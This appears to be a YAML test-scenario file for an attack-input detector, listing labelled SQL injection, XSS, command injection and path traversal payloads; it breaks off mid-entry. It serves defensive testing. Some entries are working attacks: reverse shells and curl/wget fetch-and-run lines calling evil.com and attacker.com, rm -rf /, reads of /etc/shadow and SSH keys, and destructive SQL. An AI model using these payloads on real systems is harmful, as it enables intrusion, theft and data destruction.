@@ -1,0 +1,1690 @@
+scenarios:
+  # SQL Injection - 50 scenarios
+  - id: sqli_001
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT username, password FROM users--"
+    expected: 1
+    difficulty: easy
+    description: "Basic UNION-based SQL injection"
+  
+  - id: sqli_002
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with NULL columns"
+  
+  - id: sqli_003
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND '1'='1"
+    expected: 1
+    difficulty: easy
+    description: "Boolean-based blind SQL injection"
+  
+  - id: sqli_004
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND '1'='2"
+    expected: 1
+    difficulty: easy
+    description: "Boolean-based blind (false condition)"
+  
+  - id: sqli_005
+    category: sqli
+    subcategory: time_based
+    input: "'; WAITFOR DELAY '00:00:05'--"
+    expected: 1
+    difficulty: medium
+    description: "Time-based blind SQL injection (MSSQL)"
+  
+  - id: sqli_006
+    category: sqli
+    subcategory: time_based
+    input: "' OR SLEEP(5)--"
+    expected: 1
+    difficulty: medium
+    description: "Time-based blind SQL injection (MySQL)"
+  
+  - id: sqli_007
+    category: sqli
+    subcategory: error_based
+    input: "' AND 1=CONVERT(int, (SELECT @@version))--"
+    expected: 1
+    difficulty: medium
+    description: "Error-based SQL injection"
+  
+  - id: sqli_008
+    category: sqli
+    subcategory: stacked
+    input: "'; DROP TABLE users--"
+    expected: 1
+    difficulty: hard
+    description: "Stacked query - DROP TABLE"
+  
+  - id: sqli_009
+    category: sqli
+    subcategory: stacked
+    input: "'; INSERT INTO users VALUES ('hacker', 'pass')--"
+    expected: 1
+    difficulty: hard
+    description: "Stacked query - INSERT"
+  
+  - id: sqli_010
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT table_name FROM information_schema.tables--"
+    expected: 1
+    difficulty: medium
+    description: "Information schema enumeration"
+  
+  - id: sqli_011
+    category: sqli
+    subcategory: union_based
+    input: "1' UNION SELECT NULL, version()--"
+    expected: 1
+    difficulty: medium
+    description: "Version extraction via UNION"
+  
+  - id: sqli_012
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND SUBSTRING(@@version,1,1)='5"
+    expected: 1
+    difficulty: hard
+    description: "Character-by-character extraction"
+  
+  - id: sqli_013
+    category: sqli
+    subcategory: union_based
+    input: "' UNION ALL SELECT NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION ALL variant"
+  
+  - id: sqli_014
+    category: sqli
+    subcategory: error_based
+    input: "' AND extractvalue(1, concat(0x7e, (SELECT @@version)))--"
+    expected: 1
+    difficulty: hard
+    description: "ExtractValue error-based injection"
+  
+  - id: sqli_015
+    category: sqli
+    subcategory: stacked
+    input: "'; UPDATE users SET password='hacked' WHERE id=1--"
+    expected: 1
+    difficulty: hard
+    description: "Stacked query - UPDATE"
+  
+  - id: sqli_016
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT load_file('/etc/passwd')--"
+    expected: 1
+    difficulty: hard
+    description: "File read via UNION"
+  
+  - id: sqli_017
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND (SELECT COUNT(*) FROM users) > 0--"
+    expected: 1
+    difficulty: medium
+    description: "Boolean blind with subquery"
+  
+  - id: sqli_018
+    category: sqli
+    subcategory: time_based
+    input: "' AND IF(1=1, SLEEP(5), 0)--"
+    expected: 1
+    difficulty: medium
+    description: "Conditional time-based injection"
+  
+  - id: sqli_019
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT group_concat(username) FROM users--"
+    expected: 1
+    difficulty: medium
+    description: "Group concat for data extraction"
+  
+  - id: sqli_020
+    category: sqli
+    subcategory: error_based
+    input: "' AND 1=updatexml(1, concat(0x7e, database()), 1)--"
+    expected: 1
+    difficulty: hard
+    description: "UpdateXML error-based injection"
+  
+  - id: sqli_021
+    category: sqli
+    subcategory: union_based
+    input: "-1' UNION SELECT NULL, NULL, NULL#"
+    expected: 1
+    difficulty: easy
+    description: "UNION with hash comment"
+  
+  - id: sqli_022
+    category: sqli
+    subcategory: blind_boolean
+    input: "' OR 1=1--"
+    expected: 1
+    difficulty: easy
+    description: "Classic OR 1=1 injection"
+  
+  - id: sqli_023
+    category: sqli
+    subcategory: blind_boolean
+    input: "admin'--"
+    expected: 1
+    difficulty: easy
+    description: "Comment-based authentication bypass"
+  
+  - id: sqli_024
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, user(), database()--"
+    expected: 1
+    difficulty: medium
+    description: "Current user and database extraction"
+  
+  - id: sqli_025
+    category: sqli
+    subcategory: stacked
+    input: "'; EXEC xp_cmdshell('whoami')--"
+    expected: 1
+    difficulty: hard
+    description: "Command execution via xp_cmdshell"
+  
+  - id: sqli_026
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL WHERE 1=2--"
+    expected: 1
+    difficulty: medium
+    description: "UNION with WHERE clause"
+  
+  - id: sqli_027
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1))>100--"
+    expected: 1
+    difficulty: hard
+    description: "ASCII-based blind injection"
+  
+  - id: sqli_028
+    category: sqli
+    subcategory: time_based
+    input: "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
+    expected: 1
+    difficulty: medium
+    description: "Nested SELECT with SLEEP"
+  
+  - id: sqli_029
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL FROM dual--"
+    expected: 1
+    difficulty: medium
+    description: "Oracle UNION with dual table"
+  
+  - id: sqli_030
+    category: sqli
+    subcategory: error_based
+    input: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT((SELECT @@version), 0x7e, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--"
+    expected: 1
+    difficulty: hard
+    description: "Complex error-based injection"
+  
+  - id: sqli_031
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL INTO OUTFILE '/tmp/shell.php'--"
+    expected: 1
+    difficulty: hard
+    description: "File write via UNION INTO OUTFILE"
+  
+  - id: sqli_032
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND EXISTS(SELECT * FROM users WHERE username='admin')--"
+    expected: 1
+    difficulty: medium
+    description: "EXISTS-based blind injection"
+  
+  - id: sqli_033
+    category: sqli
+    subcategory: stacked
+    input: "'; CREATE TABLE hacked (data TEXT)--"
+    expected: 1
+    difficulty: hard
+    description: "Table creation via stacked query"
+  
+  - id: sqli_034
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with 5 columns"
+  
+  - id: sqli_035
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND LENGTH(database())>5--"
+    expected: 1
+    difficulty: medium
+    description: "Length-based blind injection"
+  
+  - id: sqli_036
+    category: sqli
+    subcategory: time_based
+    input: "' AND BENCHMARK(5000000, MD5('test'))--"
+    expected: 1
+    difficulty: medium
+    description: "BENCHMARK-based time injection"
+  
+  - id: sqli_037
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL LIMIT 1--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with LIMIT"
+  
+  - id: sqli_038
+    category: sqli
+    subcategory: error_based
+    input: "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(database(), 0x7e, FLOOR(RAND()*2)) x FROM information_schema.tables GROUP BY x) y)--"
+    expected: 1
+    difficulty: hard
+    description: "Database name extraction via error"
+  
+  - id: sqli_039
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND (SELECT COUNT(*) FROM information_schema.tables)>100--"
+    expected: 1
+    difficulty: medium
+    description: "Table count enumeration"
+  
+  - id: sqli_040
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL ORDER BY 1--"
+    expected: 1
+    difficulty: medium
+    description: "UNION with ORDER BY"
+  
+  - id: sqli_041
+    category: sqli
+    subcategory: stacked
+    input: "'; GRANT ALL PRIVILEGES ON *.* TO 'hacker'@'%'--"
+    expected: 1
+    difficulty: hard
+    description: "Privilege escalation via GRANT"
+  
+  - id: sqli_042
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with 6 columns"
+  
+  - id: sqli_043
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND MID(@@version,1,1)='5'--"
+    expected: 1
+    difficulty: medium
+    description: "MID function for version check"
+  
+  - id: sqli_044
+    category: sqli
+    subcategory: time_based
+    input: "' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0)--"
+    expected: 1
+    difficulty: hard
+    description: "Conditional time-based with version check"
+  
+  - id: sqli_045
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with 7 columns"
+  
+  - id: sqli_046
+    category: sqli
+    subcategory: error_based
+    input: "' AND EXP(~(SELECT * FROM (SELECT 1) t))--"
+    expected: 1
+    difficulty: hard
+    description: "EXP overflow error-based injection"
+  
+  - id: sqli_047
+    category: sqli
+    subcategory: blind_boolean
+    input: "' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END)--"
+    expected: 1
+    difficulty: medium
+    description: "CASE-based blind injection"
+  
+  - id: sqli_048
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with 8 columns"
+  
+  - id: sqli_049
+    category: sqli
+    subcategory: stacked
+    input: "'; DELETE FROM users WHERE id>1--"
+    expected: 1
+    difficulty: hard
+    description: "Mass deletion via stacked query"
+  
+  - id: sqli_050
+    category: sqli
+    subcategory: union_based
+    input: "' UNION SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL--"
+    expected: 1
+    difficulty: easy
+    description: "UNION with 9 columns"
+
+  
+  # XSS - 40 scenarios
+  - id: xss_001
+    category: xss
+    subcategory: reflected
+    input: "<script>alert(1)</script>"
+    expected: 1
+    difficulty: easy
+    description: "Basic reflected XSS"
+  
+  - id: xss_002
+    category: xss
+    subcategory: reflected
+    input: "<img src=x onerror=alert(1)>"
+    expected: 1
+    difficulty: easy
+    description: "Image tag with onerror"
+  
+  - id: xss_003
+    category: xss
+    subcategory: reflected
+    input: "<svg onload=alert(1)>"
+    expected: 1
+    difficulty: easy
+    description: "SVG with onload"
+  
+  - id: xss_004
+    category: xss
+    subcategory: reflected
+    input: "javascript:alert(document.cookie)"
+    expected: 1
+    difficulty: easy
+    description: "JavaScript protocol handler"
+  
+  - id: xss_005
+    category: xss
+    subcategory: reflected
+    input: "<body onload=alert(1)>"
+    expected: 1
+    difficulty: easy
+    description: "Body tag with onload"
+  
+  - id: xss_006
+    category: xss
+    subcategory: dom
+    input: "<iframe src=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Iframe with JavaScript src"
+  
+  - id: xss_007
+    category: xss
+    subcategory: reflected
+    input: "<input onfocus=alert(1) autofocus>"
+    expected: 1
+    difficulty: medium
+    description: "Input with autofocus and onfocus"
+  
+  - id: xss_008
+    category: xss
+    subcategory: reflected
+    input: "<select onfocus=alert(1) autofocus>"
+    expected: 1
+    difficulty: medium
+    description: "Select with autofocus"
+  
+  - id: xss_009
+    category: xss
+    subcategory: reflected
+    input: "<textarea onfocus=alert(1) autofocus>"
+    expected: 1
+    difficulty: medium
+    description: "Textarea with autofocus"
+  
+  - id: xss_010
+    category: xss
+    subcategory: reflected
+    input: "<marquee onstart=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Marquee with onstart"
+  
+  - id: xss_011
+    category: xss
+    subcategory: polyglot
+    input: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//"
+    expected: 1
+    difficulty: hard
+    description: "XSS polyglot"
+  
+  - id: xss_012
+    category: xss
+    subcategory: reflected
+    input: "<details open ontoggle=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Details tag with ontoggle"
+  
+  - id: xss_013
+    category: xss
+    subcategory: reflected
+    input: "<video src=x onerror=alert(1)>"
+    expected: 1
+    difficulty: easy
+    description: "Video tag with onerror"
+  
+  - id: xss_014
+    category: xss
+    subcategory: reflected
+    input: "<audio src=x onerror=alert(1)>"
+    expected: 1
+    difficulty: easy
+    description: "Audio tag with onerror"
+  
+  - id: xss_015
+    category: xss
+    subcategory: reflected
+    input: "<object data=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Object tag with JavaScript data"
+  
+  - id: xss_016
+    category: xss
+    subcategory: reflected
+    input: "<embed src=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Embed tag with JavaScript src"
+  
+  - id: xss_017
+    category: xss
+    subcategory: reflected
+    input: "<form action=javascript:alert(1)><input type=submit>"
+    expected: 1
+    difficulty: medium
+    description: "Form with JavaScript action"
+  
+  - id: xss_018
+    category: xss
+    subcategory: reflected
+    input: "<button onclick=alert(1)>Click</button>"
+    expected: 1
+    difficulty: easy
+    description: "Button with onclick"
+  
+  - id: xss_019
+    category: xss
+    subcategory: reflected
+    input: "<a href=javascript:alert(1)>Click</a>"
+    expected: 1
+    difficulty: easy
+    description: "Anchor with JavaScript href"
+  
+  - id: xss_020
+    category: xss
+    subcategory: reflected
+    input: "<div onmouseover=alert(1)>Hover</div>"
+    expected: 1
+    difficulty: easy
+    description: "Div with onmouseover"
+  
+  - id: xss_021
+    category: xss
+    subcategory: reflected
+    input: "<style>@import'javascript:alert(1)';</style>"
+    expected: 1
+    difficulty: hard
+    description: "Style tag with import"
+  
+  - id: xss_022
+    category: xss
+    subcategory: reflected
+    input: "<link rel=stylesheet href=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Link tag with JavaScript href"
+  
+  - id: xss_023
+    category: xss
+    subcategory: reflected
+    input: "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>"
+    expected: 1
+    difficulty: hard
+    description: "Meta refresh with JavaScript"
+  
+  - id: xss_024
+    category: xss
+    subcategory: reflected
+    input: "<base href=javascript:alert(1)//>"
+    expected: 1
+    difficulty: hard
+    description: "Base tag with JavaScript href"
+  
+  - id: xss_025
+    category: xss
+    subcategory: reflected
+    input: "<isindex action=javascript:alert(1)>"
+    expected: 1
+    difficulty: hard
+    description: "Isindex with JavaScript action"
+  
+  - id: xss_026
+    category: xss
+    subcategory: reflected
+    input: "<table background=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Table with JavaScript background"
+  
+  - id: xss_027
+    category: xss
+    subcategory: reflected
+    input: "<td background=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "TD with JavaScript background"
+  
+  - id: xss_028
+    category: xss
+    subcategory: reflected
+    input: "<div style=width:expression(alert(1))>"
+    expected: 1
+    difficulty: hard
+    description: "CSS expression (IE)"
+  
+  - id: xss_029
+    category: xss
+    subcategory: reflected
+    input: "<img src=x:alert(1) onerror=eval(src)>"
+    expected: 1
+    difficulty: hard
+    description: "Image with eval"
+  
+  - id: xss_030
+    category: xss
+    subcategory: reflected
+    input: "<img src=x onerror=this.src='javascript:alert(1)'>"
+    expected: 1
+    difficulty: hard
+    description: "Image with this.src assignment"
+  
+  - id: xss_031
+    category: xss
+    subcategory: reflected
+    input: "<svg><script>alert(1)</script></svg>"
+    expected: 1
+    difficulty: medium
+    description: "SVG with script tag"
+  
+  - id: xss_032
+    category: xss
+    subcategory: reflected
+    input: "<svg><animate onbegin=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "SVG animate with onbegin"
+  
+  - id: xss_033
+    category: xss
+    subcategory: reflected
+    input: "<svg><set onbegin=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "SVG set with onbegin"
+  
+  - id: xss_034
+    category: xss
+    subcategory: reflected
+    input: "<svg><animatetransform onbegin=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "SVG animatetransform with onbegin"
+  
+  - id: xss_035
+    category: xss
+    subcategory: reflected
+    input: "<math><mi xlink:href=javascript:alert(1)>click"
+    expected: 1
+    difficulty: hard
+    description: "MathML with xlink:href"
+  
+  - id: xss_036
+    category: xss
+    subcategory: reflected
+    input: "<frameset onload=alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Frameset with onload"
+  
+  - id: xss_037
+    category: xss
+    subcategory: reflected
+    input: "<keygen onfocus=alert(1) autofocus>"
+    expected: 1
+    difficulty: medium
+    description: "Keygen with autofocus"
+  
+  - id: xss_038
+    category: xss
+    subcategory: reflected
+    input: "<bgsound src=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Bgsound with JavaScript src"
+  
+  - id: xss_039
+    category: xss
+    subcategory: reflected
+    input: "<applet code=javascript:alert(1)>"
+    expected: 1
+    difficulty: medium
+    description: "Applet with JavaScript code"
+  
+  - id: xss_040
+    category: xss
+    subcategory: reflected
+    input: "<script src=data:text/javascript,alert(1)></script>"
+    expected: 1
+    difficulty: hard
+    description: "Script with data URI"
+  
+  # Command Injection - 40 scenarios
+  - id: cmdi_001
+    category: cmdi
+    subcategory: shell
+    input: "| cat /etc/passwd"
+    expected: 1
+    difficulty: easy
+    description: "Pipe to cat command"
+  
+  - id: cmdi_002
+    category: cmdi
+    subcategory: shell
+    input: "; ls -la"
+    expected: 1
+    difficulty: easy
+    description: "Semicolon command separator"
+  
+  - id: cmdi_003
+    category: cmdi
+    subcategory: shell
+    input: "$(whoami)"
+    expected: 1
+    difficulty: easy
+    description: "Command substitution with $()"
+  
+  - id: cmdi_004
+    category: cmdi
+    subcategory: shell
+    input: "`id`"
+    expected: 1
+    difficulty: easy
+    description: "Command substitution with backticks"
+  
+  - id: cmdi_005
+    category: cmdi
+    subcategory: shell
+    input: "& ping -c 10 127.0.0.1"
+    expected: 1
+    difficulty: easy
+    description: "Ampersand background execution"
+  
+  - id: cmdi_006
+    category: cmdi
+    subcategory: shell
+    input: "; rm -rf /"
+    expected: 1
+    difficulty: hard
+    description: "Destructive rm command"
+  
+  - id: cmdi_007
+    category: cmdi
+    subcategory: shell
+    input: "|| cat /etc/shadow"
+    expected: 1
+    difficulty: medium
+    description: "OR operator for command chaining"
+  
+  - id: cmdi_008
+    category: cmdi
+    subcategory: shell
+    input: "&& cat /etc/hosts"
+    expected: 1
+    difficulty: medium
+    description: "AND operator for command chaining"
+  
+  - id: cmdi_009
+    category: cmdi
+    subcategory: powershell
+    input: "; Get-Process"
+    expected: 1
+    difficulty: easy
+    description: "PowerShell Get-Process"
+  
+  - id: cmdi_010
+    category: cmdi
+    subcategory: powershell
+    input: "| Get-ChildItem"
+    expected: 1
+    difficulty: easy
+    description: "PowerShell Get-ChildItem"
+  
+  - id: cmdi_011
+    category: cmdi
+    subcategory: shell
+    input: "; curl http://evil.com/shell.sh | bash"
+    expected: 1
+    difficulty: hard
+    description: "Remote shell download and execution"
+  
+  - id: cmdi_012
+    category: cmdi
+    subcategory: shell
+    input: "; wget http://evil.com/backdoor -O /tmp/bd && chmod +x /tmp/bd && /tmp/bd"
+    expected: 1
+    difficulty: hard
+    description: "Wget backdoor installation"
+  
+  - id: cmdi_013
+    category: cmdi
+    subcategory: shell
+    input: "; nc -e /bin/sh attacker.com 4444"
+    expected: 1
+    difficulty: hard
+    description: "Netcat reverse shell"
+  
+  - id: cmdi_014
+    category: cmdi
+    subcategory: shell
+    input: "; bash -i >& /dev/tcp/attacker.com/4444 0>&1"
+    expected: 1
+    difficulty: hard
+    description: "Bash TCP reverse shell"
+  
+  - id: cmdi_015
+    category: cmdi
+    subcategory: shell
+    input: "; python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
+    expected: 1
+    difficulty: hard
+    description: "Python reverse shell"
+  
+  - id: cmdi_016
+    category: cmdi
+    subcategory: shell
+    input: "; perl -e 'use Socket;$i=\"attacker.com\";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
+    expected: 1
+    difficulty: hard
+    description: "Perl reverse shell"
+  
+  - id: cmdi_017
+    category: cmdi
+    subcategory: shell
+    input: "; ruby -rsocket -e'f=TCPSocket.open(\"attacker.com\",4444).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
+    expected: 1
+    difficulty: hard
+    description: "Ruby reverse shell"
+  
+  - id: cmdi_018
+    category: cmdi
+    subcategory: shell
+    input: "; php -r '$sock=fsockopen(\"attacker.com\",4444);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
+    expected: 1
+    difficulty: hard
+    description: "PHP reverse shell"
+  
+  - id: cmdi_019
+    category: cmdi
+    subcategory: shell
+    input: "; cat /etc/passwd | grep root"
+    expected: 1
+    difficulty: medium
+    description: "Piped grep command"
+  
+  - id: cmdi_020
+    category: cmdi
+    subcategory: shell
+    input: "; find / -name \"*.conf\" 2>/dev/null"
+    expected: 1
+    difficulty: medium
+    description: "Find command with error redirection"
+  
+  - id: cmdi_021
+    category: cmdi
+    subcategory: obfuscated
+    input: "; c\\at /etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Backslash obfuscation"
+  
+  - id: cmdi_022
+    category: cmdi
+    subcategory: obfuscated
+    input: "; ca''t /etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Empty string obfuscation"
+  
+  - id: cmdi_023
+    category: cmdi
+    subcategory: obfuscated
+    input: "; ca\"\"t /etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Double quote obfuscation"
+  
+  - id: cmdi_024
+    category: cmdi
+    subcategory: obfuscated
+    input: "; ${IFS}cat${IFS}/etc/passwd"
+    expected: 1
+    difficulty: hard
+    description: "IFS variable obfuscation"
+  
+  - id: cmdi_025
+    category: cmdi
+    subcategory: obfuscated
+    input: "; cat</etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Input redirection without space"
+  
+  - id: cmdi_026
+    category: cmdi
+    subcategory: shell
+    input: "; echo 'hacked' > /var/www/html/shell.php"
+    expected: 1
+    difficulty: hard
+    description: "File write via echo"
+  
+  - id: cmdi_027
+    category: cmdi
+    subcategory: shell
+    input: "; crontab -l"
+    expected: 1
+    difficulty: medium
+    description: "Crontab listing"
+  
+  - id: cmdi_028
+    category: cmdi
+    subcategory: shell
+    input: "; ps aux"
+    expected: 1
+    difficulty: easy
+    description: "Process listing"
+  
+  - id: cmdi_029
+    category: cmdi
+    subcategory: shell
+    input: "; netstat -an"
+    expected: 1
+    difficulty: medium
+    description: "Network connections listing"
+  
+  - id: cmdi_030
+    category: cmdi
+    subcategory: shell
+    input: "; uname -a"
+    expected: 1
+    difficulty: easy
+    description: "System information"
+  
+  - id: cmdi_031
+    category: cmdi
+    subcategory: shell
+    input: "; env"
+    expected: 1
+    difficulty: easy
+    description: "Environment variables"
+  
+  - id: cmdi_032
+    category: cmdi
+    subcategory: shell
+    input: "; history"
+    expected: 1
+    difficulty: medium
+    description: "Command history"
+  
+  - id: cmdi_033
+    category: cmdi
+    subcategory: shell
+    input: "; sudo -l"
+    expected: 1
+    difficulty: medium
+    description: "Sudo privileges check"
+  
+  - id: cmdi_034
+    category: cmdi
+    subcategory: shell
+    input: "; cat ~/.ssh/id_rsa"
+    expected: 1
+    difficulty: hard
+    description: "SSH private key extraction"
+  
+  - id: cmdi_035
+    category: cmdi
+    subcategory: shell
+    input: "; cat ~/.bash_history"
+    expected: 1
+    difficulty: medium
+    description: "Bash history extraction"
+  
+  - id: cmdi_036
+    category: cmdi
+    subcategory: shell
+    input: "; iptables -L"
+    expected: 1
+    difficulty: medium
+    description: "Firewall rules listing"
+  
+  - id: cmdi_037
+    category: cmdi
+    subcategory: shell
+    input: "; mount"
+    expected: 1
+    difficulty: easy
+    description: "Mounted filesystems"
+  
+  - id: cmdi_038
+    category: cmdi
+    subcategory: shell
+    input: "; df -h"
+    expected: 1
+    difficulty: easy
+    description: "Disk usage"
+  
+  - id: cmdi_039
+    category: cmdi
+    subcategory: shell
+    input: "; ifconfig"
+    expected: 1
+    difficulty: easy
+    description: "Network interface configuration"
+  
+  - id: cmdi_040
+    category: cmdi
+    subcategory: shell
+    input: "; route -n"
+    expected: 1
+    difficulty: medium
+    description: "Routing table"
+
+  
+  # Path Traversal - 30 scenarios
+  - id: path_001
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/passwd"
+    expected: 1
+    difficulty: easy
+    description: "Basic path traversal"
+  
+  - id: path_002
+    category: path_traversal
+    subcategory: basic
+    input: "..\\..\\..\\windows\\system32\\config\\sam"
+    expected: 1
+    difficulty: easy
+    description: "Windows path traversal"
+  
+  - id: path_003
+    category: path_traversal
+    subcategory: encoded
+    input: "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "URL encoded path traversal"
+  
+  - id: path_004
+    category: path_traversal
+    subcategory: encoded
+    input: "..%252f..%252f..%252fetc/passwd"
+    expected: 1
+    difficulty: hard
+    description: "Double URL encoded path traversal"
+  
+  - id: path_005
+    category: path_traversal
+    subcategory: basic
+    input: "....//....//....//etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Double dot slash variant"
+  
+  - id: path_006
+    category: path_traversal
+    subcategory: null_byte
+    input: "../../../etc/passwd%00.jpg"
+    expected: 1
+    difficulty: hard
+    description: "Null byte injection"
+  
+  - id: path_007
+    category: path_traversal
+    subcategory: basic
+    input: "/var/www/../../etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Absolute path with traversal"
+  
+  - id: path_008
+    category: path_traversal
+    subcategory: encoded
+    input: "..%c0%af..%c0%af..%c0%afetc/passwd"
+    expected: 1
+    difficulty: hard
+    description: "UTF-8 encoded path traversal"
+  
+  - id: path_009
+    category: path_traversal
+    subcategory: basic
+    input: "../../../../../../etc/passwd"
+    expected: 1
+    difficulty: easy
+    description: "Deep path traversal"
+  
+  - id: path_010
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/shadow"
+    expected: 1
+    difficulty: medium
+    description: "Shadow file access"
+  
+  - id: path_011
+    category: path_traversal
+    subcategory: basic
+    input: "../../../proc/self/environ"
+    expected: 1
+    difficulty: medium
+    description: "Process environment access"
+  
+  - id: path_012
+    category: path_traversal
+    subcategory: basic
+    input: "../../../var/log/apache2/access.log"
+    expected: 1
+    difficulty: medium
+    description: "Log file access"
+  
+  - id: path_013
+    category: path_traversal
+    subcategory: encoded
+    input: "..%5c..%5c..%5cwindows%5csystem32%5cconfig%5csam"
+    expected: 1
+    difficulty: hard
+    description: "URL encoded Windows path"
+  
+  - id: path_014
+    category: path_traversal
+    subcategory: basic
+    input: "file:///etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "File protocol handler"
+  
+  - id: path_015
+    category: path_traversal
+    subcategory: basic
+    input: "../../../home/user/.ssh/id_rsa"
+    expected: 1
+    difficulty: hard
+    description: "SSH key access"
+  
+  - id: path_016
+    category: path_traversal
+    subcategory: basic
+    input: "../../../root/.bash_history"
+    expected: 1
+    difficulty: medium
+    description: "Bash history access"
+  
+  - id: path_017
+    category: path_traversal
+    subcategory: encoded
+    input: "%2e%2e/%2e%2e/%2e%2e/etc/passwd"
+    expected: 1
+    difficulty: medium
+    description: "Mixed encoding"
+  
+  - id: path_018
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/hosts"
+    expected: 1
+    difficulty: easy
+    description: "Hosts file access"
+  
+  - id: path_019
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/mysql/my.cnf"
+    expected: 1
+    difficulty: medium
+    description: "MySQL config access"
+  
+  - id: path_020
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/apache2/apache2.conf"
+    expected: 1
+    difficulty: medium
+    description: "Apache config access"
+  
+  - id: path_021
+    category: path_traversal
+    subcategory: encoded
+    input: "..%2f..%2f..%2fetc%2fpasswd"
+    expected: 1
+    difficulty: medium
+    description: "Slash encoded path"
+  
+  - id: path_022
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/group"
+    expected: 1
+    difficulty: easy
+    description: "Group file access"
+  
+  - id: path_023
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/issue"
+    expected: 1
+    difficulty: easy
+    description: "Issue file access"
+  
+  - id: path_024
+    category: path_traversal
+    subcategory: basic
+    input: "../../../etc/motd"
+    expected: 1
+    difficulty: easy
+    description: "MOTD file access"
+  
+  - id: path_025
+    category: path_traversal
+    subcategory: basic
+    input: "../../../proc/version"
+    expected: 1
+    difficulty: medium
+    description: "Kernel version access"
+  
+  - id: path_026
+    category: path_traversal
+    subcategory: basic
+    input: "../../../proc/cpuinfo"
+    expected: 1
+    difficulty: easy
+    description: "CPU info access"
+  
+  - id: path_027
+    category: path_traversal
+    subcategory: basic
+    input: "../../../proc/meminfo"
+    expected: 1
+    difficulty: easy
+    description: "Memory info access"
+  
+  - id: path_028
+    category: path_traversal
+    subcategory: encoded
